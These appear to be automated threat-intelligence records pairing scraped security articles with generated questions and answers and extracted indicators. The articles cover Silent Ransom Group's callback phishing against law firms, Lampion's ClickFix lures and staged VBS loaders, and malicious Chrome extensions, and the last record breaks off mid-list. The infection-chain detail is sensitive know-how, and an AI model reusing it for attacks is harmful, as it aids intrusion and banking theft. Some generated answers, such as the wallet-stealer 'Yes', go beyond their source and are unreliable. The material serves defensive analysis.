"keywords_found": ["phishing", "apt", "intelligence", "passwords", "browser", "threat"], "article_textual_content": "# Silent Ransom Group targeting law firms, the FBI warns\n\n## FBI warns Silent Ransom Group has targeted U.S. law firms for 2 years using callback phishing and social engineering extortion tactics.\n\nThe FBI warns that the Silent Ransom Group, active since 2022 and also known as Luna Moth, has targeted U.S. law firms using phishing and social engineering. Linked to BazarCall campaigns, the group previously enabled Ryuk and Conti ransomware attacks.\n\n“The cyber threat actor Silent Ransom Group (SRG), also known as Luna Moth, Chatty Spider, and UNC3753, is targeting law firms using information technology (IT) themed social engineering calls, and callback phishing emails, to gain remote access to systems or devices and steal sensitive data to extort the victims.” reads the alert issued by the FBI. “While SRG has historically victimized companies in many sectors, starting Spring 2023, the group has consistently targeted US-based law firms, likely due to the highly sensitive nature of legal industry data.”\n\nAs of March 2025, SRG began posing as IT staff in phone calls, tricking employees into granting remote access. They then exfiltrate data using tools like WinSCP or Rclone, often without needing admin privileges. This new tactic is recent but highly effective, leading to multiple successful breaches.\n\nAfter stealing data, the Silent Ransom Group group extorts victims with ransom emails threatening to sell or publish the data. They also call employees to pressure them into negotiations.\n\nSRG operates a data leak site, but the FBI noticed that they use it inconsistently and don’t always follow through on their threats to post the data.\n\nThe group campaigns leave minimal traces and often evade antivirus detection by using legitimate remote access tools. Indicators of SRG activity include unauthorized downloads of tools like Zoho Assist or AnyDesk, external WinSCP/Rclone connections, ransom emails or calls from unnamed groups, and phishing emails about subscriptions urging recipients to call a number to cancel charges.\n\n“Implement basic cyber hygiene to include being suspicious, robust passwords, multifactor authentication, and installation of antivirus tools.” concludes the report. “For SRG threat actors:\n\n- Conduct staff training on resisting phishing attempts\n- Develop and communicate policies surrounding when and how company’s IT will authenticate themselves with employees\n- Maintain regular backups of company data\n- Implement two-factor authentication for all employees”\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, FBI)\n\n#### you might also like\n\n##### Operation RapTor led to the arrest of 270 dark web vendors and buyers\n\n##### Chinese threat actors exploited Trimble Cityworks flaw to breach U.S. local government networks\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### Silent Ransom Group targeting law firms, the FBI warns\n\nMalware / May 24, 2025\n\n###### Operation RapTor led to the arrest of 270 dark web vendors and buyers\n\nDeep Web / May 23, 2025\n\n###### Chinese threat actors exploited Trimble Cityworks flaw to breach U.S. local government networks\n\nHacking / May 23, 2025\n\n###### U.S. CISA adds a Samsung MagicINFO 9 Server flaw to its Known Exploited Vulnerabilities catalog\n\nHacking / May 22, 2025\n\n###### New Signal update stops Windows from capturing user chats\n\nDigital ID / May 22, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://unit42.paloaltonetworks.com/lampion-malware-clickfix-lures/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lampion is an infostealer malware that focuses on sensitive banking information.", "question": "What kind of malware is it?"}, {"answer": "The attack involves a social engineering technique called ClickFix, which lures victims into copying and executing malicious commands on their machine under the guise of fixing computer problems.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Lampion malware is an infostealer that focuses on stealing sensitive banking information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the Lampion malware is an infostealer that focuses on sensitive banking information.", "question": "Is it related to wallet stealer?"}, {"answer": "The Lampion malware is an infostealer that focuses on stealing sensitive banking information.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the cloud-hosted command-and-control (C2) server.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations are Portuguese organizations, particularly in the government, finance, and transportation sectors. No specific bank names or wallets are mentioned in the context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://unit42.paloaltonetworks.com/lampion-malware-clickfix-lures/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "autoridade-tributaria[.]com"}, {"type": "Domain or URL", "value": "inde-faturas[.]com"}, {"type": "Domain or URL", "value": "http://18.116.63[.]61/ifeellike.php"}, {"type": "Domain or URL", "value": "http://18.116.63[.]61/trogloditas.php"}, {"type": "Domain or URL", "value": "http://3.135.249[.]199/prayfor.php"}, {"type": "Domain or URL", "value": "http://18.217.122[.]187/proposito.php"}, {"type": "Domain or URL", "value": "http://18.226.150[.]56/persistir.php"}, {"type": "Domain or URL", "value": "http://3.142.40[.]36/grow.php"}, {"type": "Domain or URL", "value": "http://18.216.78[.]94/aceitalo.php"}, {"type": "Domain or URL", "value": "http://3.23.103[.]13/stick.php"}, {"type": "IP Address", "value": "5.8.9.77"}, {"type": "IP Address", "value": "83.242.96.159"}, {"type": "IP Address", "value": "18.221.69.167"}, {"type": "IP Address", "value": "18.222.97.143"}, {"type": "IP Address", "value": "18.116.15.129"}, {"type": "IP Address", "value": "18.220.96.58"}, {"type": "IP Address", "value": "3.135.200.135"}, {"type": "IP Address", "value": "18.191.192.110"}, {"type": "IP Address", "value": "18.224.38.123"}, {"type": "IP Address", "value": "18.118.163.100"}, {"type": "IP Address", "value": "3.147.127.14"}, {"type": "IP Address", "value": "3.138.32.196"}, {"type": "IP Address", "value": "18.117.11.70"}, {"type": "IP Address", "value": "18.117.173.119"}, {"type": "IP Address", "value": "18.116.28.153"}, {"type": "IP Address", "value": "3.16.76.203"}, {"type": "IP Address", "value": "3.15.7.241"}, {"type": "IP Address", "value": "3.15.155.141"}, {"type": "IP Address", "value": "18.117.71.203"}, {"type": "IP Address", "value": "3.133.160.140"}, {"type": "IP Address", "value": "3.133.113.215"}, {"type": "IP Address", "value": "3.143.24.42"}, {"type": "IP Address", "value": "18.217.180.185"}, {"type": "IP Address", "value": "3.23.105.171"}, {"type": "IP Address", "value": "3.142.200.117"}, {"type": "IP Address", "value": "3.128.34.187"}, {"type": "IP Address", "value": "18.191.240.233"}, {"type": "SHA256 Hash", "value": "ee4c8e4cce55bd40afa1fb0bc0eee3d7c23d0ebe2db48c2092e854f6ca1472ce"}, {"type": "SHA256 Hash", "value": "4aeb84dd71588a35084109ff5525c7bff2f30e0ed58ce139621b17f2374bdb35"}, {"type": "SHA256 Hash", "value": "bba48cf24bb9e6bdcbc79c2241f101e3dd4127ab450e3dbbe1b79fa738f06483"}, {"type": "SHA256 Hash", "value": "29b63fcf8e5f08fd12166507b3a85746e3ec685ae0620a124e64125ecd9ccf9b"}, {"type": "SHA256 Hash", "value": "58fe2a7d4435c9c24c98d33aff1110add4bf95add31558f51289a028ddafcc6e"}, {"type": "SHA256 Hash", "value": "334dfbaefbf7e6301d2385f95d861eb6dae9018c48fb298a2cbf5f364fbcdb2d"}, {"type": "SHA256 Hash", "value": "1681c3b88ed315543ac1bf07d258d560cf2f85bfd26c10471d71700eaeb57fb3"}], "keywords_found": ["cybercrime", "cryptocurrency", "analysis", "malicious", "phishing", "apt", "intelligence", "bank", "crimeware", "browser", "fraud", "threat"], "article_textual_content": "# Lampion Is Back With ClickFix Lures\n\n- By:\n    - Noa Dekel\n- Published:May 6, 2025\n- Categories:\n    - Cybercrime\n    - Malware\n    - Threat Research\n- Tags:\n    - PowerShell\n    - VBScript\n\n## Executive Summary\n\nUnit 42 researchers recently uncovered a highly focused malicious campaign targeting dozens of Portuguese organizations, particularly in the government, finance and transportation sectors. This campaign was orchestrated by the threat actors behind Lampion malware, an infostealer that focuses on sensitive banking information. This malware family has been active since at least 2019.\n\nDuring our investigation, we found that the group has added ClickFix lures to their arsenal. ClickFix is a social engineering technique that multiple malware families have adopted since late 2024, which lures victims to copy and execute malicious commands on their machine, under the guise of fixing computer problems.\n\nThis campaign follows many of the same patterns as previous Lampion malware activity in terms of targets and infrastructure, as well as tactics, techniques and procedures (TTPs). These included multiple, highly obfuscated Visual Basic (VB) scripts as part of the attack chain, and similarities in the initial social engineering themes.\n\nWhile the final payload was commented out in the activity we observed, we could otherwise determine the full infection chain, including loaders. It is possible that a new wave of attacks could instead deliver the final payload.\n\nThe techniques and activities presented in this article highlight the importance of implementing enhanced detection capabilities to identify complex and obfuscated threats.\n\nPalo Alto Networks customers are better protected from the threats described here through the following products and services:\n\n- Advanced WildFire\n- Advanced URL Filtering and Advanced DNS Security\n- Cortex XDR and XSIAM\n\nIf you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.\n\n## Technical Analysis of the Lampion Campaign\n\nBetween late 2024 and early 2025, we noticed an increase in attacks against Portuguese companies. In the process of examining our telemetry, we noticed one campaign in particular that demonstrated unusual size and focus. Although the campaign used several measures to evade traditional detection mechanisms, we successfully identified and disrupted the infection chain.\n\nThis campaign can be linked to Lampion banking malware, an infostealer that focuses on sensitive banking information. For example, the C2 server used in this campaign is the same server that was used in successful Lampion infections in the past. Furthermore, we found the same TTPs being used as in past Lampion campaigns: multiple, highly obfuscated VB scripts, indirect execution of consecutive stages, and similar initial infection lure subjects.\n\n### Infection Chain Analysis: A Long and Winding Road\n\nThe campaign’s infection chain began with a phishing email that contains a malicious ZIP file attachment. An HTML file within this ZIP file redirects the victim to autoridade-tributaria[.]com, a website mimicking a legitimate Portuguese tax authority.\n\nUpon going to the website, the victim is then presented with a fake document or software installation page that prompts them to copy a malicious PowerShell command and execute it in the Run dialog. This command includes a comment in Portuguese: “#Habilitar Visualização de ficheiro” (this translates to “Enable File Preview” in English). This is shown at the end of the code snippet below.\n\nFigure 1. Code snippet from PowerShell command.\n\nThis command is the heart of the ClickFix fraud, which is a technique that is being used by various crimeware strains such as Lumma Stealer and NetSupport RAT — and now also Lampion. When an attacker uses ClickFix in a social engineering attack, the victim is prompted to copy malicious commands to their Run dialog or terminals to “fix” a certain problem.\n\nThis technique manipulates the victim into running a malicious command that infects their machine.\n\nThe victim’s execution of the malicious PowerShell command downloads and executes an obfuscated Visual Basic Script (VBS) file, which is part of this campaign. Figure 1 depicts the infection chain below.\n\nFigure 2. Lampion's ClickFix infection chain.\n\nAnother interesting aspect of Lampion’s infection chain is that it is divided into several non-consecutive stages, executed as separate processes. This dispersed execution complicates detection, as the attack flow does not form a readily identifiable process tree. Instead, it comprises a complex chain of individual events, some of which could appear benign in isolation.\n\nIn the next section, we take a deep dive into the VBS infection chain, which combines multiple obfuscation and bloating techniques that attackers implemented in these scripts.\n\n### Analysis of Stages 1 and 2: Initial VBS Downloaders\n\nThe first and second stages of this campaign have several different versions, mainly varying in size and filenames. Overall, both use multiple obfuscation methods such as junk variables and indirect ASCII conversions to bloat the original code to a significant size. This type of obfuscation hinders the work of both defenders and analysts, by obscuring the script’s main functionality.\n\nOnce the first stage is executed, it writes a similarly obfuscated second-stage downloader in the %TEMP% folder. To further thwart detection, the first stage does not directly execute the second but rather creates a hidden scheduled task to be triggered at a random time.\n\nThe sole function of the second stage is to download yet another VBS stager from a cloud-hosted server. This stager is disguised as a PHP file, a technique used repeatedly throughout this campaign. Figure 2 shows a deobfuscated code snippet from the first stage responsible for writing the second stage.\n\nFigure 3. Deobfuscated first stage writing second stage content.\n\n### Analysis of Stage 3: The Final VBS Payload\n\nThe third VBS stands out due to its large size (between 30 MB and 50 MB). Although it is filled with junk variables and obfuscated functions, this stage is also more robust in its functions.\n\nThe third stage VBS is in charge of reconnaissance and detection evasion maneuvers, such as:\n\n- Checking for existing security products using Windows Management Instrumentation (WMI)\n- Discerning whether the victim’s machine is a sandbox or virtual machine (VM)\n- Gathering initial data on the targeted endpoint, including a unique MD5 value of a victim ID, Base64-encoded under the GET request parameter dados= (“data” in Portuguese)\n- Sending the encoded ID to the cloud-hosted command-and-control (C2) server\n\nFigure 3 depicts the process tree generated during stage 3 execution.\n\nFigure 4. Process tree of third stage execution as shown in Cortex XDR.\n\nSimilar to the previous stages, the third stage does not directly execute the fourth stage but instead creates a complex execution method:\n\n- First, it writes the content of the command shown in Figure 3 into a .cmd file in the Windows startup folder and names it after the victim’s hostname\n- Afterwards, the script creates a hidden scheduled task that forces the system to shut down\n- The shutdown triggers the execution of the .cmd file during the subsequent startup, ultimately launching the fourth-stage DLL loader with rundll32.exe\n\nWe believe the threat actor reuses this stage across multiple campaigns with varying infection vectors. By looking at the comments present in the script, we can see a decoded version of a curl command that was supposed to download the final Lampion payload from the attacker’s C2. Since the attacker deactivated the command for downloading the payload by placing it within a comment block, the final Lampion payload was not downloaded in this campaign.\n\nFigure 5. Alternative method of downloading Lampion via curl, commented out by the attacker.\n\nFurthermore, the attacker left other comments that revealed the script’s functionality in Portuguese (such as “obtain information on antivirus software,” shown in Figure 5).\n\nFigure 6. Comments in Portuguese by the threat actors.\n\nDespite their many efforts to obfuscate code, in certain cases the attacker kept an unencoded version of some of the commands that the code executed. These are translated into natural language and placed in comments, as shown in Figure 6.\n\nFigure 7. Comments containing a decoded version of fourth stage execution.\n\nAnalysis of Stage 4: The Loader DLL\n\nAfter exfiltrating initial reconnaissance data, the third stage VBScript tries to download the fourth stage — a DLL loader — from another cloud-hosted address that redirects to hxxps://inde-faturas[.]com/54879878. The fourth stage DLL’s name is generated from the infection timestamp, in YYYYMMDDHHmmSS format (e.g., 20241201120101.dll).\n\nThis loader variant is also extremely large, at over 700 MB. This makes it impossible for people to upload to crowd-sourced threat intelligence platforms, thus increasing the difficulty for defenders.\n\nAs outlined above, the DLL is triggered by rundll32.exe, which calls a different export function for each unique victim. All functions are usually words in Portuguese, unlike past campaigns in which the fourth stage was triggered by a randomized function name.\n\nUnlike previous campaigns that downloaded the fourth stage along with a zipped Lampion payload, this campaign only downloads the aforementioned DLL. This could indicate either a mistake on the attacker’s part or a testing phase for the next wave of attacks. The commented-out commands relating to the .zip payload download suggest incomplete or incorrect content.\n\nConclusion\n\nWe recently detected a campaign that targets Portuguese-speaking individuals and organizations in various sectors, including government, finance and transportation. This campaign aligns with TTPs and indicators that Lampion used in the past. It also shows the group’s adaptation of a new initial attack vector: ClickFix lures.\n\nThe increasing prevalence of ClickFix, coupled with low awareness of its risks, poses a significant threat. We advise security practitioners to proactively address this evolving threat by:\n\n- Increasing awareness by educating personnel to be wary of ClickFix lures\n- Setting up defense and monitoring measures for PowerShell scripting and clipboard activity\n\nPalo Alto Networks Protection and Mitigation\n\nPalo Alto Networks customers are better protected from the Lampion attack vector through Cortex XDR and XSIAM.\n\nCortex XDR VBS Local Analysis Module and Advanced WildFire classify the Lampion VBS loader samples discussed in this article as malicious.\n\nAdvanced URL Filtering and Advanced DNS Security identify known URLs and domains associated with ClickFix campaigns as malicious.\n\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:\n\n- North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)\n- UK: +44.20.3743.3660\n- Europe and Middle East: +31.20.299.3130\n- Asia: +65.6983.8730\n- Japan: +81.50.1790.0200\n- Australia: +61.2.4062.7950\n- India: 00080005045107\n\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.\n\n## Appendix A\n\n### Detection With Cortex XDR VBS Local Analysis Module\n\nThe new Cortex XDR VBS Local Analysis Module provides enhanced detection capabilities to identify complex and obfuscated VBS threats. In the campaign described above, several rules were triggered by malicious activity originating from impacted endpoints. Figure 7 below depicts alerts that were triggered due to the execution of malicious VBScripts as part of the attack.\n\nFigure 8. Malicious VBScript detection and prevention shown in Cortex XDR.\n\n## Indicators of Compromise\n\nPhishing Email\n\n- ee4c8e4cce55bd40afa1fb0bc0eee3d7c23d0ebe2db48c2092e854f6ca1472ce\n\nStage 1 VBS\n\n- 4aeb84dd71588a35084109ff5525c7bff2f30e0ed58ce139621b17f2374bdb35\n\nStage 2 VBS\n\n- bba48cf24bb9e6bdcbc79c2241f101e3dd4127ab450e3dbbe1b79fa738f06483\n- 29b63fcf8e5f08fd12166507b3a85746e3ec685ae0620a124e64125ecd9ccf9b\n\nStage 3 VBS\n\n- 58fe2a7d4435c9c24c98d33aff1110add4bf95add31558f51289a028ddafcc6e\n- 334dfbaefbf7e6301d2385f95d861eb6dae9018c48fb298a2cbf5f364fbcdb2d\n- 1681c3b88ed315543ac1bf07d258d560cf2f85bfd26c10471d71700eaeb57fb3\n\nLampion C2 Stage 4 Loader\n\n- 5.8.9[.]77\n- 83.242.96[.]159\n\nDomains\n\n- Inde-faturas[.]com\n- autoridade-tributaria[.]com\n\nC2 URLs\n\n- http://18.116.63[.]61/ifeellike.php\n- http://18.116.63[.]61/trogloditas.php\n- http://3.135.249[.]199/prayfor.php\n- http://18.217.122[.]187/proposito.php\n- http://18.226.150[.]56/persistir.php\n- http://3.142.40[.]36/grow.php\n- http://18.216.78[.]94/aceitalo.php\n- http://3.23.103[.]13/stick.php\n\nC2 IPv4 Addresses (Cloud-Hosted)\n\n- 18.221.69[.]167\n- 18.222.97[.]143\n- 18.116.15[.]129\n- 18.220.96[.]58\n- 3.135.200[.]135\n- 18.191.192[.]110\n- 18.224.38[.]123\n- 18.118.163[.]100\n- 3.147.127[.]14\n- 3.138.32[.]196\n- 18.117.11[.]70\n- 18.117.173[.]119\n- 18.116.28[.]153\n- 3.16.76[.]203\n- 3.15.7[.]241\n- 3.15.155[.]141\n- 18.117.71[.]203\n- 3.133.160[.]140\n- 3.133.113[.]215\n- 3.143.24[.]42\n- 18.217.180[.]185\n- 3.23.105[.]171\n- 3.142.200[.]117\n- 3.128.34[.]187\n- 18.191.240[.]233\n- 3.147.86[.]100\n\n## Additional Resources\n\n- Lumma Stealer ClickFix Distribution – eSentire\n- Security Brief: ClickFix Social Engineering Technique Floods Threat Landscape – ProofPoint\n- ClickFix: The Social Engineering Technique Hackers Use to Manipulate Victims – Group-IB\n- New Lampion Variant In The Wild [PDF] – SOC8 Technical Report, Layer8\n- Targeting Portugal: A new trojan ‘Lampion’ has spread using template emails from the Portuguese Government Finance &amp; Tax – Segurança Informática\n- Data Obfuscation: Junk Data – MITRE ATT&amp;CK\n\n### Tags\n\n- PowerShell\n- VBScript\n\n### Table of Contents\n\n### Related Articles\n\n- Cascading Shadows: An Attack Chain Approach to Avoid Detection and Complicate Analysis\n- BlueSky Ransomware: Fast Encryption via Multithreading\n- Practical Behavioral Profiling of PowerShell Scripts through Static Analysis (Part 2)\n\n## Related  Resources\n\n#### Threat Group Assessment: Muddled Libra (Updated May 16, 2025)\n\n- 0ktapus\n- Muddled Libra\n- Social engineering\n\n#### DarkCloud Stealer: Comprehensive Analysis of a New Attack Chain That Employs AutoIt\n\n- AutoIT\n- Infostealer\n\n#### Stealthy .NET Malware: Hiding Malicious Payloads as Bitmap Resources\n\n- .NET\n- Agent Tesla\n- Microsoft Windows\n\n#### Iranian Cyber Actors Impersonate Model Agency in Suspected Espionage Operation\n\n- Iran\n- Social engineering\n- Phishing\n\n#### AI Agents Are Here. So Are the Threats.\n\n- Prompt injection\n\n#### Gremlin Stealer: New Stealer on Sale in Underground Forum\n\n- Cryptocurrency\n- Infostealer\n- Telegram\n\n#### Extortion and Ransomware Trends January-March 2025\n\n- BianLian\n- Akira ransomware\n- Muddled Libra\n\n#### False Face: Unit 42 Demonstrates the Alarming Ease of Synthetic Identity Creation\n\n- DPRK\n- Social engineering\n- Wagemole\n\n#### Cascading Shadows: An Attack Chain Approach to Avoid Detection and Complicate Analysis\n\n- XLoader\n- RemcosRAT\n\n## Peace of mind comes from staying ahead of threats. Subscribe today.\n\nSubscribe for email updates to all Unit 42 threat research.\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\n\nInvalid captcha!\n\n## Get the latest news, invites to events, and threat alerts\n\nBy submitting this form, you agree to our\n                                    Terms of Use\n                                    and acknowledge our\n                                    Privacy Statement.\n\n## Products and Services\n\n- AI-Powered Network Security Platform\n- Secure AI by Design\n- Prisma AIRS\n- AI Access Security\n- Cloud Delivered Security Services\n- Advanced Threat Prevention\n- Advanced URL Filtering\n- Advanced WildFire\n- Advanced DNS Security\n- Enterprise Data Loss Prevention\n- Enterprise IoT Security\n- Medical IoT Security\n- Industrial OT Security\n- SaaS Security\n\n- Next-Generation Firewalls\n- Hardware Firewalls\n- Software Firewalls\n- Strata Cloud Manager\n- SD-WAN for NGFW\n- PAN-OS\n- Panorama\n- Secure Access Service Edge\n- Prisma SASE\n- Application Acceleration\n- Autonomous Digital Experience Management\n- Enterprise DLP\n- Prisma Access\n- Prisma Access Browser\n- Prisma SD-WAN\n- Remote Browser Isolation\n- SaaS Security\n\n- AI-Driven Security Operations Platform\n- Cloud Security\n- Cortex Cloud\n- Application Security\n- Cloud Posture Security\n- Cloud Runtime Security\n- Prisma Cloud\n- AI-Driven SOC\n- Cortex XSIAM\n- Cortex XDR\n- Cortex XSOAR\n- Cortex Xpanse\n- Unit 42 Managed Detection &amp; Response\n- Managed XSIAM\n\n- Threat Intel and Incident Response Services\n- Proactive Assessments\n- Incident Response\n- Transform Your Security Strategy\n- Discover Threat Intelligence\n\n## Company\n\n- About Us\n- Careers\n- Contact Us\n- Corporate Responsibility\n- Customers\n- Investor Relations\n- Location\n- Newsroom\n\n## Popular Links\n\n- Blog\n- Communities\n- Content Library\n- Cyberpedia\n- Event Center\n- Manage Email Preferences\n- Products A-Z\n- Product Certifications\n- Report a Vulnerability\n- Sitemap\n- Tech Docs\n- Unit 42\n- Do Not Sell or Share My Personal Information\n\n- Privacy\n- Trust Center\n- Terms of Use\n- Documents\n\nCopyright © 2025 Palo Alto Networks. All Rights Reserved\n\n- EN Select your language\n\n### Default Heading"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://layerxsecurity.com/blog/layerx-reveals-40malicious-browser-extensions/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is in the form of malicious browser extensions that grant attackers persistent access to user sessions, allowing for data theft, impersonation, and potential entry into corporate environments.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing campaign using malicious browser extensions that impersonate popular tools and brands.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malicious extensions grant attackers persistent access to user sessions, allowing for data theft, including credential theft.", "question": "Is there credential theft from the browser?"}, {"answer": "The malicious extensions are already Chrome extensions, and they are installed by users, often unknowingly, as they masquerade as legitimate brands.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The malicious extensions grant attackers persistent access to user sessions, allowing for data theft, but it does not specify stealing credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malicious extensions grant attackers persistent access to user sessions, allowing for data theft, impersonation, and potential entry into corporate environments, including stealing cookies and injecting scripts.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://layerxsecurity.com/blog/layerx-reveals-40malicious-browser-extensions/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://forti-vpn[.]com/"}, {"type": "Domain or URL", "value": "https://manusai[.]sbs"}, {"type": "Domain or URL", "value": "https://sitestats[.]world"}, {"type": "Domain or URL", "value": "https://clothingbrandnamegenerator[.]app"}, {"type": "Domain or URL", "value": "winchester[.]abram37"}, {"type": "Domain or URL", "value": "https://amlsector[.]com"}, {"type": "Domain or URL", "value": "https://cryptowhalesvision[.]world"}, {"type": "Domain or URL", "value": "https://calendly-daily[.]com"}, {"type": "Domain or URL", "value": "https://calendly-docket[.]com"}, {"type": "Domain or URL", "value": "https://creativehunter[.]world"}, {"type": "Domain or URL", "value": "https://twin-web[.]world"}, {"type": "Domain or URL", "value": "https://eventphere[.]com"}, {"type": "Domain or URL", "value": "https://sqlitebrowser[.]app"}, {"type": "Domain or URL", "value": "https://ai-chat-bot[.]pro"}, {"type": "Domain or URL", "value": "https://ai-sentence-rewriter[.]com"}, {"type": "Domain or URL", "value": "https://pdf-to-jpg[.]app"}, {"type": "Domain or URL", "value": "https://htmlvalidator[.]app"}, {"type": "Domain or URL", "value": "https://cmschecker[.]app"}, {"type": "Domain or URL", "value": "https://hourlytosalarycalculator[.]app"}, {"type": "Domain or URL", "value": "https://cssvalidator[.]app"}, {"type": "Domain or URL", "value": "https://email-checker[.]pro"}, {"type": "Domain or URL", "value": "https://crypto-whale[.]top"}, {"type": "Domain or URL", "value": "https://web-analytics[.]top"}, {"type": "Domain or URL", "value": "https://ad-vision[.]click"}, {"type": "Domain or URL", "value": "https://madgicx-plus[.]com"}, {"type": "Domain or URL", "value": "https://similar-net[.]com"}, {"type": "Domain or URL", "value": "https://meta-spy[.]help"}, {"type": "Domain or URL", "value": "https://raccoon-vpn[.]world"}, {"type": "Domain or URL", "value": "https://orchid-vpn[.]com"}, {"type": "Domain or URL", "value": "https://soul-vpn[.]com"}, {"type": "Domain or URL", "value": "https://websitemonitoring[.]pro"}, {"type": "Domain or URL", "value": "https://aiwriter[.]expert"}, {"type": "Domain or URL", "value": "https://aiadgenerator[.]app"}, {"type": "Domain or URL", "value": "https://headlinegenerator[.]app"}, {"type": "Domain or URL", "value": "https://webwatch[.]world"}, {"type": "Domain or URL", "value": "https://youtube-vision[.]world"}, {"type": "Domain or URL", "value": "https://web-metrics[.]link"}, {"type": "Domain or URL", "value": "https://bitcoin-price[.]live"}, {"type": "Domain or URL", "value": "https://u99[.]pro"}, {"type": "Domain or URL", "value": "calendlydaily[.]world"}, {"type": "Domain or URL", "value": "calendly-director[.]com"}, {"type": "Chrome Extension ID", "value": "ccollcihnnpcbjcgcjfmabegkpbehnip"}, {"type": "Chrome Extension ID", "value": "aeibljandkelbcaaemkdnbaacppjdmom"}, {"type": "Chrome Extension ID", "value": "fcfmhlijjmckglejcgdclfneafoehafm"}, {"type": "Chrome Extension ID", "value": "abbngaojehjekanfdipifimgmppiojpl"}, {"type": "Chrome Extension ID", "value": "dohmiglipinohflhapdagfgbldhmoojl"}, {"type": "Chrome Extension ID", "value": "acmiibcdcmaghndcahglamnhnlmcmlng"}, {"type": "Chrome Extension ID", "value": "mipophmjfhpecleajkijfifmffcjdiac"}, {"type": "Chrome Extension ID", "value": "cknmibbkfbephciofemdjndbgebggnkc"}, {"type": "Chrome Extension ID", "value": "gmigkpkjegnpmjpmnmgnkhmoinpgdnfc"}, {"type": "Chrome Extension ID", "value": "ahgccenjociolkbpgbfibmfclcfnlaei"}, {"type": "Chrome Extension ID", "value": "kjhjnbdjonamibpaalanflmidplhiehe"}, {"type": "Chrome Extension ID", "value": "pobknfocgoijjmokmhimkfhemcnigdji"}, {"type": "Chrome Extension ID", "value": "iclckldkfemlnecocpphinnplnmijkol"}, {"type": "Chrome Extension ID", "value": "jmpcodajbcpgkebjipbmjdoboehfiddd"}, {"type": "Chrome Extension ID", "value": "ihdnbohcfnegemgomjcpckmpnkdgopon"}, {"type": "Chrome Extension ID", "value": "oeefjlikahigmlnplgijgeeecbpemhip"}, {"type": "Chrome Extension ID", "value": "aofddmgnidinflambjlfkpboeamdldbd"}, {"type": "Chrome Extension ID", "value": "acchdggcflgidjdcnhnnkfengdcmldae"}, {"type": "Chrome Extension ID", "value": "albakpncdngcejcjdahomfbkakbmafgb"}, {"type": "Chrome Extension ID", "value": "hhlcpmdhlcoghhfgiiopcjbkfmdliknc"}, {"type": "Chrome Extension ID", "value": "eheagnmidghfknkcaehacggccfiidhik"}, {"type": "Chrome Extension ID", "value": "ckcfkaikieiicfdeomgehmnjglnofhde"}, {"type": "Chrome Extension ID", "value": 